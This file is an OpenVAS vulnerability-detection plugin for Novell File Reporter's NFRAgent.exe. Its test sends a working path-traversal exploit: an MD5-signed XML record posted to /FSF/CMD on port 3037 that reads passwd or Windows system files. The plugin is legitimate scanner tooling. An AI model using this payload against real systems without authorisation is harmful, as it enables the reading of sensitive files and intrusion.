###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_file_reporter_56579.nasl 12 2013-10-27 11:15:33Z jan $
#
# Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Novell File Reporter is prone to the following security
vulnerabilities:

1. A heap-based buffer-overflow vulnerability

2. Multiple arbitrary file-download vulnerabilities

3. An arbitrary file-upload vulnerability

Remote attackers can exploit these issues to upload and download
arbitrary files and execute arbitrary code in the context of the
application.

Novell File Reporter 1.0.2 is vulnerable; other versions may also
be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103623";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56579);
 script_cve_id("CVE-2012-4956","CVE-2012-4957","CVE-2012-4958","CVE-2012-4959");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56579");
 script_xref(name : "URL" , value : "http://www.novell.com/products/file-reporter/");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-12-12 17:33:48 +0100 (Wed, 12 Dec 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = 3037;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port, transport:ENCAPS_SSLv23);
if(!soc)exit(0);

files = traversal_files();

foreach file (keys(files)) {

  result = '';

  if("passwd" >< files[file]) {
    path = '../../../../../../../../../../../../../../' + files[file];
  } else {
    path = '..\\..\\..\\..\\..\\..\\..\\..\\..\\' + files[file];
  }  

  ex = '<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>' + path  + '</FILE></RECORD>';
  ex_md5 = toupper(hexstr(MD5('SRS' + ex + 'SERVER')));

  ex = ex_md5 + ex;

  len = strlen(ex);

  req = string("POST /FSF/CMD HTTP/1.1\r\n",
               "Host: 192.168.2.8:3037\r\n",
               "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n",
               "Content-Type: text/xml\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
               ex);

  send(socket:soc, data:req);
  x = 0;
  while (recv = recv(socket:soc, length:1024)) {

    x++;
    result += recv; 
    if(x>10)break;
  
  }

  if(eregmatch(pattern:file, string:result)) {
    security_hole(port:port);
    exit(0);
  }  
} 